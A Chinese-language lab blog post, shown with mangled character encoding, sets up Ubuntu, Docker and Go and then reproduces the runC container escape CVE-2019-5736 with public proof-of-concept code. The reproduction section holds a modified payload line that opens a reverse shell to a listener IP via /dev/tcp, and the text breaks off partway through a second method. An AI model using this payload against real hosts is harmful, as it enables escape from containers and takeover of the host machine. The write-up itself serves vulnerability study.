<p>å€ŸåŠ© VMware Workstation Proï¼Œæ‚¨å¯ä»¥å°†å¤šä¸ªæ“ä½œç³»ç»Ÿä½œä¸ºè™šæ‹Ÿæœºï¼ˆåŒ…æ‹¬ Windows è™šæ‹Ÿæœºï¼‰åœ¨å•å° Windows æˆ– Linux PC ä¸Šè¿è¡Œï¼ŒVMware Workstation Pro æ˜¯å°†å¤šä¸ªæ“ä½œç³»ç»Ÿä½œä¸ºè™šæ‹Ÿæœº (VM) åœ¨å•å° Linux æˆ– Windows PC ä¸Šè¿è¡Œçš„è¡Œä¸šæ ‡å‡†ã€‚ä¸ºä»»ä½•è®¾å¤‡ã€å¹³å°æˆ–äº‘ç¯å¢ƒæ„å»ºã€æµ‹è¯•æˆ–æ¼”ç¤ºè½¯ä»¶çš„ IT ä¸“ä¸šäººå‘˜ã€å¼€å‘äººå‘˜å’Œä¼ä¸šéƒ½å¯ä»¥ä½¿ç”¨ï¼Œå¯å¤§å¤§æå‡å·¥ä½œæ•ˆç‡çš„é«˜æ€§èƒ½å·¥å…·ã€‚å¼€å‘äººå‘˜å°†è·å¾—ä¸€ä¸ªæ‰©å±•æ€§å¼ºçš„å·¥ç¨‹è®¾è®¡ç¯å¢ƒã€‚</p>
<p>VMware Workstation å¯åœ¨ä¸€éƒ¨å®ä½“æœºå™¨ä¸Šæ¨¡æ‹Ÿå®Œæ•´çš„ç½‘ç»œç¯å¢ƒï¼Œä»¥åŠå¯ä¾¿äºæºå¸¦çš„è™šæ‹Ÿæœºå™¨ï¼Œå…¶æ›´å¥½çš„çµæ´»æ€§ä¸å…ˆè¿›çš„æŠ€æœ¯èƒœè¿‡äº†å¸‚é¢ä¸Šå…¶ä»–çš„è™šæ‹Ÿè®¡ç®—æœºè½¯ä»¶ã€‚å¯¹äºä¼ä¸šçš„ ITå¼€å‘äººå‘˜å’Œç³»ç»Ÿç®¡ç†å‘˜è€Œè¨€ï¼Œ VMware åœ¨è™šæ‹Ÿç½‘è·¯ï¼Œå®æ—¶å¿«ç…§ï¼Œæ‹–æ›³å…±äº«æ–‡ä»¶å¤¹ï¼Œæ”¯æŒ PXE ç­‰æ–¹é¢çš„ç‰¹ç‚¹ä½¿å®ƒæˆä¸ºå¿…ä¸å¯å°‘çš„å·¥å…·ã€‚</p>
<p>VMware Workstation å…è®¸æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºåœ¨ä¸€å°è™šæ‹Ÿæœºå†…éƒ¨è¿è¡Œã€‚è™šæ‹Ÿæœºæ˜¯ç‹¬ç«‹è¿è¡Œä¸»æœºæ“ä½œç³»ç»Ÿçš„ç¦»æ•£ç¯å¢ƒã€‚åœ¨ VMware Workstation ä¸­ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªçª—å£ä¸­åŠ è½½ä¸€å°è™šæ‹Ÿæœºï¼Œå®ƒå¯ä»¥è¿è¡Œè‡ªå·±çš„æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºã€‚å¯ä»¥åœ¨è¿è¡Œäºæ¡Œé¢ä¸Šçš„å¤šå°è™šæ‹Ÿæœºä¹‹é—´åˆ‡æ¢ï¼Œé€šè¿‡ä¸€ä¸ªç½‘ç»œå…±äº«è™šæ‹Ÿæœºï¼ŒæŒ‚èµ·å’Œæ¢å¤è™šæ‹Ÿæœºä»¥åŠé€€å‡ºè™šæ‹Ÿæœºï¼Œè¿™ä¸€åˆ‡ä¸ä¼šå½±å“ä½ çš„ä¸»æœºæ“ä½œå’Œä»»ä½•æ“ä½œç³»ç»Ÿæˆ–è€…å…¶å®ƒæ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚</p>
<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><hr>
<p>Ubuntuæ˜¯ä¸€ä¸ªä»¥æ¡Œé¢åº”ç”¨ä¸ºä¸»çš„<strong>Linux</strong>æ“ä½œç³»ç»Ÿï¼Œå…¶åç§°æ¥è‡ªéæ´²å—éƒ¨ç¥–é²è¯­æˆ–è±ªè¨è¯­çš„â€œ<strong>ubuntu</strong>â€œä¸€è¯ï¼Œæ„æ€æ˜¯â€œäººæ€§â€â€œæˆ‘çš„å­˜åœ¨æ˜¯å› ä¸ºå¤§å®¶çš„å­˜åœ¨â€ï¼Œæ˜¯éæ´²ä¼ ç»Ÿçš„ä¸€ç§ä»·å€¼è§‚ã€‚UbuntuåŸºäº<strong>Debian</strong>å‘è¡Œç‰ˆå’ŒGnomeæ¡Œé¢ç¯å¢ƒï¼Œè€Œä»11.04ç‰ˆèµ·ï¼ŒUbuntuå‘è¡Œç‰ˆæ”¾å¼ƒäº†<strong>Gnome</strong>æ¡Œé¢ç¯å¢ƒï¼Œæ”¹ä¸ºUnityã€‚ä»å‰äººä»¬è®¤ä¸ºLinuxéš¾ä»¥å®‰è£…ã€éš¾ä»¥ä½¿ç”¨ï¼Œåœ¨Ubuntuå‡ºç°åè¿™äº›éƒ½æˆä¸ºäº†å†å²ã€‚Ubuntuä¹Ÿæ‹¥æœ‰åºå¤§çš„ç¤¾åŒºåŠ›é‡ï¼Œç”¨æˆ·å¯ä»¥æ–¹ä¾¿åœ°ä»ç¤¾åŒºè·å¾—å¸®åŠ©ã€‚</p>
<h3 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h3><hr>
<p>Kali Linux æ˜¯ä¸€ä¸ªåŸºäºDebian çš„Linux ç‰ˆæœ¬ ,é¢å‘ä¸“ä¸šçš„æ¸—é€æµ‹è¯•å’Œå®‰å…¨å®¡è®¡ã€‚å¯ä»¥æŠŠå®ƒç†è§£ä¸ºä¸€ä¸ªç‰¹æ®Šçš„Linuxå‘è¡Œç‰ˆï¼Œé›†æˆäº†è¶…è¿‡äº†600ç§ç²¾å¿ƒæŒ‘é€‰çš„æ¸—é€æµ‹è¯•çš„å·¥å…·(å¦‚ <strong>Metasploit FrameWork</strong> , <strong>Nmap</strong>ç­‰)ï¼Œä¾›æ¸—é€æµ‹è¯•å’Œå®‰å…¨è®¾è®¡äººå‘˜ä½¿ç”¨ï¼Œä¹Ÿå¯ç§°ä¹‹ä¸ºå¹³å°æˆ–è€…æ¡†æ¶ã€‚</p>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><hr>
<p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäºGo è¯­è¨€å¹¶éµä»Apache2.0åè®®å¼€æº,é¡¹ç›®ä¸»è¦ä»£ç åœ¨2013å¹´å¼€æºäº GitHubã€‚å®ƒæ˜¯äº‘æœåŠ¡æŠ€æœ¯ä¸Šçš„ä¸€æ¬¡åˆ›æ–°ï¼Œè®©åº”ç”¨ç¨‹åºå¸ƒç½²åœ¨è½¯ä»¶å®¹å™¨ä¸‹çš„å·¥ä½œå¯ä»¥è‡ªåŠ¨åŒ–è¿›è¡Œï¼Œå€Ÿæ­¤åœ¨ Linux æ“ä½œç³»ç»Ÿä¸Šï¼Œæä¾›ä¸€ä¸ªé¢å¤–çš„è½¯ä»¶æŠ½è±¡å±‚ï¼Œä»¥åŠæ“ä½œç³»ç»Ÿå±‚è™šæ‹ŸåŒ–çš„è‡ªåŠ¨ç®¡ç†æœºåˆ¶ã€‚</p>
<p>Docker åˆ©ç”¨ Linux æ ¸å¿ƒä¸­çš„èµ„æºåˆ†è„±æœºåˆ¶ï¼Œä¾‹å¦‚ cgroupsï¼Œ Linux æ ¸å¿ƒåå­—ç©ºé—´ï¼ˆname spaceï¼‰ï¼Œä»¥åŠAUFSç±»çš„UnionFSç­‰æŠ€æœ¯ï¼Œå¯¹è¿›ç¨‹è¿›è¡Œå°è£…éš”ç¦»ï¼Œå±äºæ“ä½œç³»ç»Ÿå±‚é¢çš„è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ç”±äºéš”ç¦»çš„è¿›ç¨‹ç‹¬ç«‹äºå®¿ä¸»å’Œå…¶å®ƒçš„éš”ç¦»çš„è¿›ç¨‹ï¼Œå› æ­¤ä¹Ÿç§°å…¶ä¸ºå®¹å™¨ã€‚Docker åœ¨å®¹å™¨çš„åŸºç¡€ä¸Šè¿›è¡Œäº†è¿›ä¸€æ­¥çš„å°è£…ï¼Œä»æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œäº’è”åˆ°è¿›ç¨‹éš”ç¦»ç­‰ç­‰ï¼Œæå¤§çš„ç®€åŒ–äº†å®¹å™¨çš„åˆ›å»ºå’Œç»´æŠ¤ï¼Œä½¿å¾—å…¶æ¯”è™šæ‹ŸæœºæŠ€æœ¯æ›´ä¸ºè½»ä¾¿ã€å¿«æ·ã€‚Docker å¯ä»¥åœ¨å•ä¸€ Linux å®ä½“ä¸‹è¿ä½œï¼Œé¿å…å› ä¸ºåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºè€Œé€ æˆçš„é¢å¤–è´Ÿæ‹…ã€‚ä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€åº”ç”¨è¿›ç¨‹ï¼›è€Œå®¹å™¨å†…çš„åº”ç”¨è¿›ç¨‹ç›´æ¥è¿è¡Œäºå®¿ä¸»çš„å†…æ ¸ï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰è¿›è¡Œç¡¬ä»¶è™šæ‹Ÿã€‚å› æ­¤å®¹å™¨è¦æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿ã€‚</p>
<p>Docker å’Œä¼ ç»Ÿè™šæ‹Ÿæœºå¯¹æ¯”ï¼Œå…·æœ‰æ›´å¿«çš„å¯åŠ¨é€Ÿåº¦ã€æ›´é«˜æ•ˆçš„èµ„æºåˆ©ç”¨ç‡ã€æ›´é«˜çš„ç³»ç»Ÿæ”¯æŒé‡ã€æŒç»­äº¤ä»˜ä¸éƒ¨ç½²ã€æ›´è½»æ¾çš„è¿ç§»ã€æ›´è½»æ¾çš„ç»´æŠ¤ä¸æ‰©å±•ç­‰ä¼˜ç‚¹ã€‚</p>
<p>Docker Hubæ˜¯Dockeræä¾›çš„ä¸€é¡¹æœåŠ¡ï¼Œç”¨äºå¯»æ‰¾å’Œå…±äº«å®¹å™¨é•œåƒã€‚å®ƒæ˜¯ä¸–ç•Œä¸Šæœ€å¤§çš„å®¹å™¨æ˜ åƒåº“ï¼Œå…¶å†…å®¹æ¥æºåŒ…æ‹¬å®¹å™¨ç¤¾åŒºå¼€å‘è€…ã€å¼€æºé¡¹ç›®å’Œç‹¬ç«‹è½¯ä»¶ä¾›åº”å•†ï¼ˆISVï¼‰åœ¨å®¹å™¨ä¸­æ„å»ºå’Œå‘å¸ƒä»–ä»¬çš„ä»£ç ã€‚å®ƒæ˜¯ä¸€ä¸ªåœ¨çº¿å­˜å‚¨åº“ï¼ŒDocker é•œåƒå¯ä»¥ç”±å…¶ä»–ç”¨æˆ·å‘å¸ƒå’Œä½¿ç”¨ã€‚</p>
<h4 id="Dockerå¸¸ç”¨å‘½ä»¤"><a href="#Dockerå¸¸ç”¨å‘½ä»¤" class="headerlink" title="Dockerå¸¸ç”¨å‘½ä»¤"></a>Dockerå¸¸ç”¨å‘½ä»¤</h4><p><strong>dockr images</strong>           åˆ—å‡ºæœ¬åœ°é•œåƒ</p>
<p><strong>docker ps</strong>             æŸ¥çœ‹å½“å‰è¿è¡Œçš„å®¹å™¨</p>
<p><strong>docker ps -a</strong>            æŸ¥çœ‹å…¨éƒ¨å®¹å™¨</p>
<p><strong>docker pull  NAME[:TAG]</strong>     ä»é•œåƒä»“åº“ä¸­æ‹‰å–æˆ–è€…æ›´æ–°æŒ‡å®šé•œåƒ</p>
<p><strong>docker restart  container_id</strong>     é‡å¯å®¹å™¨</p>
<p><strong>docker build -f Dockerfile_PATH</strong>   docker build å‘½ä»¤ç”¨äºä½¿ç”¨ Dockerfile åˆ›å»ºé•œåƒã€‚</p>
<p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARGâ€¦]</strong></p>
<p><strong>OPTIONS è¯´æ˜:</strong></p>
<p><strong>-d:</strong> åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨ID</p>
<p><strong>-p:</strong> æŒ‡å®šç«¯å£æ˜ å°„ï¼Œæ ¼å¼ä¸ºï¼šä¸»æœº(å®¿ä¸»)ç«¯å£:å®¹å™¨ç«¯å£</p>
<p><strong>â€“name</strong> â€œåç§° â€œ : ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼›</p>
<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><hr>
<p>Goè¯­è¨€ï¼ˆä¹Ÿç§°ä¸ºGolangï¼‰æ˜¯googleåœ¨2009å¹´æ¨å‡ºçš„ä¸€ç§ç¼–è¯‘å‹ç¼–ç¨‹è¯­è¨€ã€‚ ç›¸å¯¹äºå¤§å¤šæ•°è¯­è¨€ï¼Œgolangå…·æœ‰ç¼–å†™å¹¶å‘æˆ–ç½‘ç»œäº¤äº’ç®€å•ã€ä¸°å¯Œçš„æ•°æ®ç±»å‹ã€ç¼–è¯‘å¿«ç­‰ç‰¹ç‚¹ï¼Œæ¯”è¾ƒé€‚åˆäºé«˜æ€§èƒ½ã€é«˜å¹¶å‘åœºæ™¯ã€‚ â€¦ golangæ­£æ˜¯ç”±ä¸€ä¸ªå¼ºå¤§å›¢é˜Ÿåˆ©ç”¨è¿™20%æ—¶é—´å¼€å‘çš„ã€‚</p>
<h4 id="Golang-å¸¸ç”¨å‘½ä»¤"><a href="#Golang-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="Golang å¸¸ç”¨å‘½ä»¤"></a>Golang å¸¸ç”¨å‘½ä»¤</h4><p>build: ç¼–è¯‘åŒ…å’Œä¾èµ–ã€‚</p>
<p>run: ç¼–è¯‘å¹¶è¿è¡Œgoç¨‹åºã€‚</p>
<p>clean: ç§»é™¤å½“å‰æºç åŒ…é‡Œé¢ç¼–è¯‘ç”Ÿæˆçš„æ–‡ä»¶ã€‚</p>
<p>fmt: è¿è¡Œgofmtè¿›è¡Œæ ¼å¼åŒ–ã€‚</p>
<p>get: ä¸‹è½½å¹¶å®‰è£…åŒ…å’Œä¾èµ–ã€‚</p>
<p>install: ç¼–è¯‘å¹¶å®‰è£…åŒ…å’Œä¾èµ–ã€‚</p>
<p>list: åˆ—å‡ºåŒ…ã€‚</p>
<p>version: æ˜¾ç¤ºå½“å‰ç¯å¢ƒå®‰è£…goçš„ç‰ˆæœ¬</p>
<h4 id="äº¤å‰ç¼–è¯‘"><a href="#äº¤å‰ç¼–è¯‘" class="headerlink" title="äº¤å‰ç¼–è¯‘"></a>äº¤å‰ç¼–è¯‘</h4><ul>
<li><strong>å¤šå¹³å° ( <code>äº¤å‰ç¼–è¯‘</code> )</strong></li>
</ul>
<p><strong>ä¸€ã€Mac ä¸‹ç¼–è¯‘ Linux å’Œ Windows 64ä½å¯æ‰§è¡Œç¨‹åº</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=linux </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=windows </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>

<p><strong>äºŒã€Linux ä¸‹ç¼–è¯‘ Mac å’Œ Windows 64ä½å¯æ‰§è¡Œç¨‹åº</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=darwin </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=windows </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>

<p><strong>ä¸‰ã€Windows ä¸‹ç¼–è¯‘ Mac å’Œ Linux 64ä½å¯æ‰§è¡Œç¨‹åº</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=darwin</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=linux</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>

<p><code>GOOS</code>ï¼šç›®æ ‡å¹³å°çš„æ“ä½œç³»ç»Ÿï¼ˆdarwinã€freebsdã€linuxã€windowsï¼‰ GOARCHï¼šç›®æ ‡å¹³å°çš„ä½“ç³»æ¶æ„ï¼ˆ386ã€amd64ã€armï¼‰ äº¤å‰ç¼–è¯‘ä¸æ”¯æŒ CGO æ‰€ä»¥è¦ç¦ç”¨å®ƒ</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="å®‰è£…Ubuntu-16-04"><a href="#å®‰è£…Ubuntu-16-04" class="headerlink" title="å®‰è£…Ubuntu 16.04"></a>å®‰è£…Ubuntu 16.04</h3><hr>
<p>é¦–å…ˆä»å®˜ç½‘ä¸‹è½½é•œåƒ ,</p>
<p>ä¸‹è½½åœ°å€: <a href="https://releases.ubuntu.com/16.04/">https://releases.ubuntu.com/16.04/</a></p>
<p>ä½¿ç”¨ Vmware Workstation è™šæ‹Ÿæœºè¿›è¡Œå®‰è£…</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290916928.png" alt="image-20211201133831599"></p>
<p>å®‰è£…å®Œæ¯•, ä¼šè‡ªåŠ¨å®‰è£… Vmware-tools</p>
<p>å¦‚è‹¥æ²¡æœ‰ , å¯ä»¥æ‰‹åŠ¨è¿›è¡Œå®‰è£… , è¯¦æƒ…å‚è€ƒ <a href="https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html">vmware å®˜æ–¹æ–‡æ¡£</a></p>
<p>[+] <strong>å®˜æ–¹æ–‡æ¡£ :</strong>  <a href="https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html">https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html</a></p>
<ul>
<li><strong>Ubuntuã€Debian åŠç›¸å…³æ“ä½œç³»ç»Ÿ</strong></li>
</ul>
<ol>
<li><p>è¯·ç¡®ä¿å·²æ›´æ–°è½¯ä»¶åŒ…ç´¢å¼•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¦‚æœè™šæ‹Ÿæœºå…·æœ‰ GUIï¼ˆX11 ç­‰ï¼‰ï¼Œè¯·å®‰è£…æˆ–å‡çº§<br>open-vm-tools-desktopï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools-desktop</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¦åˆ™ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…<br>open-vm-toolsï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="å®‰è£…Docker-ç¯å¢ƒ"><a href="#å®‰è£…Docker-ç¯å¢ƒ" class="headerlink" title="å®‰è£…Docker ç¯å¢ƒ"></a>å®‰è£…Docker ç¯å¢ƒ</h3><hr>
<blockquote>
<p>  <strong>Linux ç¯å¢ƒ</strong>:  Ubuntu 16.04</p>
</blockquote>
<blockquote>
<p>  <strong>docker ç‰ˆæœ¬</strong></p>
<ul>
<li>docker version &lt;&#x3D;18.09.2</li>
<li>RunC version &lt;&#x3D;1.0-rc6</li>
</ul>
</blockquote>
<h4 id="è„šæœ¬æ­å»ºè¿‡ç¨‹"><a href="#è„šæœ¬æ­å»ºè¿‡ç¨‹" class="headerlink" title="è„šæœ¬æ­å»ºè¿‡ç¨‹"></a><strong>è„šæœ¬æ­å»ºè¿‡ç¨‹</strong></h4><blockquote>
<p>  (æ”¯æŒ<strong>Ubuntu</strong> å’Œ <strong>CentOS</strong>) </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure>



<h4 id="æ‰‹å·¥æ­å»ºè¿‡ç¨‹"><a href="#æ‰‹å·¥æ­å»ºè¿‡ç¨‹" class="headerlink" title="æ‰‹å·¥æ­å»ºè¿‡ç¨‹"></a><strong>æ‰‹å·¥æ­å»ºè¿‡ç¨‹</strong></h4><p>Ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh &amp;&amp; \</span><br><span class="line">sudo VERSION=18.06.0 sh get-docker.sh</span><br></pre></td></tr></table></figure>

<p>1ã€æ›´æ–°ç´¢å¼•åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>2ã€å®‰è£…ä»¥ä¸‹åŒ…ï¼Œä»¥ä½¿ apt å¯ä»¥é€šè¿‡ https ä½¿ç”¨ repository</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure>

<p>3ã€æ·»åŠ Dockerå®˜æ–¹çš„GPGå¯†é’¥å¹¶æ›´æ–°ç´¢å¼•åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -` `</span><br><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>

<ul>
<li>å®‰è£…æŒ‡å®šçš„dockerç‰ˆæœ¬</li>
</ul>
<p>1ã€åˆ—å‡ºå¯ç”¨ç‰ˆæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-cache madison docker-ce</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917408.png" alt="image-20211206140408904"></p>
<p>2ã€é€‰æ‹©ä¸€ä¸ªç‰ˆæœ¬æ¥å®‰è£…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install docker-ce=&lt;VERSION&gt;</span><br><span class="line">æ¯”å¦‚ï¼š $ sudo apt-get install docker-ce=18.06.1~ce~3-0~ubuntu</span><br></pre></td></tr></table></figure>

<p>3ã€æŸ¥çœ‹æ˜¯å¦å®‰è£…æ­£å¸¸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl start docker` `$ docker info</span><br></pre></td></tr></table></figure>



<h3 id="é…ç½®GoLangç¯å¢ƒ"><a href="#é…ç½®GoLangç¯å¢ƒ" class="headerlink" title="é…ç½®GoLangç¯å¢ƒ"></a>é…ç½®GoLangç¯å¢ƒ</h3><hr>
<h4 id="å®‰è£…Golang"><a href="#å®‰è£…Golang" class="headerlink" title="å®‰è£…Golang"></a>å®‰è£…Golang</h4><p>aptå®‰è£…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install golang</span><br></pre></td></tr></table></figure>

<p>å®˜ç½‘ æºç  ç¼–è¯‘å®‰è£…</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>å…ˆæ‹‰å– ä¸€ä¸ªå®¹å™¨ ä¾‹å¦‚ &#x3D;&#x3D;Ubuntu 16.04&#x3D;&#x3D; </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker pull ubuntu:16.04</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290916939.png" alt="image-20211022222251029"></p>
<p>å¯åŠ¨å®¹å™¨</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d -it b6</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917870.png" alt="image-20211022222830729"></p>
<p>è¿™é‡Œé€šè¿‡ exec å‘½ä»¤æ¨¡æ‹Ÿ é»‘å®¢ è·å–åˆ°å®¹å™¨çš„rootæƒé™çš„shell</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -it 35 bash</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917219.png" alt="image-20211022223004305"></p>
<h3 id="å¤ç°æ–¹å¼ä¸€"><a href="#å¤ç°æ–¹å¼ä¸€" class="headerlink" title="å¤ç°æ–¹å¼ä¸€"></a>å¤ç°æ–¹å¼ä¸€</h3><p>ä½¿ç”¨pocè¿›è¡Œæ”»å‡»ï¼Œgithub é¡¹ç›®åœ°å€:</p>
<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
<p>å¾ªç¯ç­‰å¾… runC initçš„ PID -&gt; open(â€œ&#x2F;proc&#x2F;pid&#x2F;exeâ€ï¼ŒO_RDONLY) -&gt; execve()é‡Šæ”¾ runCçš„IOå¹¶è¦†ç›–runCäºŒè¿›åˆ¶æ–‡ä»¶ -&gt; execve()æ‰§è¡Œè¢«è¦†ç›– runC</p>
<p>ä¿®æ”¹payload</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n /bin/bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917901.png" alt="image-20211206150536431"></p>
<p>ä¿®æ”¹poc , bash ä¹Ÿå¯getshell</p>
<p>ä¿®æ”¹payload, ç¼–è¯‘poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go build main.go</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼  , æ‰§è¡Œpocæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917173.png" alt="image-20211022223803309"></p>
<p>æ­¤æ—¶, å¦‚æœç”¨æˆ·ä»å®¿ä¸»æœºé€šè¿‡execå‘½ä»¤è¿›å…¥å®¹å™¨å†…å®¹ , å°±èƒ½æˆåŠŸè§¦å‘poc</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917438.png" alt="image-20211022224107696"></p>
<p>æ”»å‡»æœºæˆåŠŸæ”¶åˆ° åå¼¹shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917091.png" alt="image-20211022224359412"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹ ip , ç¡®å®šshell æ¥è‡ªå®¿ä¸»æœº</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918481.png" alt="image-20211022224302900"></p>
<h3 id="å¤ç°æ–¹å¼äºŒ"><a href="#å¤ç°æ–¹å¼äºŒ" class="headerlink" title="å¤ç°æ–¹å¼äºŒ"></a>å¤ç°æ–¹å¼äºŒ</h3><p>æ„é€ æœ‰æ¼æ´çš„å®¹å™¨é•œåƒ, å®Œæˆæ¼æ´å¤ç°</p>
<p>GitHub åœ°å€: <strong><a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a></strong></p>
<p>æ€è·¯: ç ”ç©¶äººå‘˜é€šè¿‡æ¬ºéª—runC init execve -&gt; runc æ‰§è¡Œ&#x2F;proc&#x2F;self&#x2F;exe -&gt; &#x2F;proc&#x2F;[runc-pid]&#x2F;exeè¦†ç›–runC äºŒè¿›åˆ¶æ–‡ä»¶</p>
<blockquote>
<p>  Dockerfileæ–‡ä»¶</p>
</blockquote>
<p>1.è·å–libseccompæ–‡ä»¶å¹¶å°†run_at_linkæ–‡ä»¶åŠ å…¥ï¼ŒrunCå¯åŠ¨è¿è¡Œlibseccompã€‚</p>
